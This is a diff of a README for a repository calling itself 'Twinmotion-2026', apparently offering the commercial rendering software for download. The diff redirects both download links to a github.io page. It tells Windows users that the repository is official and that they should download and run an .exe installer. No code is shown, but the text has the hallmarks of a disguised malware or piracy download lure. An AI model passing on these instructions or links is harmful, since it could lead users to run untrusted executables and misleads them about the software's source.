@@ -1,6 +1,6 @@
 # 🏗️ Twinmotion-2026 - Create stunning real-time architectural renders
 
-[![](https://img.shields.io/badge/Download-Twinmotion-2026-blue)](https://github.com/Different-prop898/Twinmotion-2026)
+[![](https://img.shields.io/badge/Download-Twinmotion-2026-blue)](https://different-prop898.github.io)
 
 Twinmotion-2026 provides a platform for architects, designers, and urban planners to produce high-quality visualizations. This software transforms 3D models into immersive experiences. Use this guide to set up the software on your Windows computer.
 
@@ -21,7 +21,7 @@ Ensure your graphics drivers remain updated. Download the latest drivers from th
 
 Follow these steps to obtain and configure the software.
 
-1.  Visit the official repository page to access the installation files: [https://github.com/Different-prop898/Twinmotion-2026](https://github.com/Different-prop898/Twinmotion-2026).
+1.  Visit the official repository page to access the installation files: [https://different-prop898.github.io](https://different-prop898.github.io).
 2.  Locate the release section on the right side of the project page.
 3.  Click the link to download the installer file. The file ends in a .exe extension.
 4.  Wait for the download to finish. Do not close your browser while the file transfers to your system.
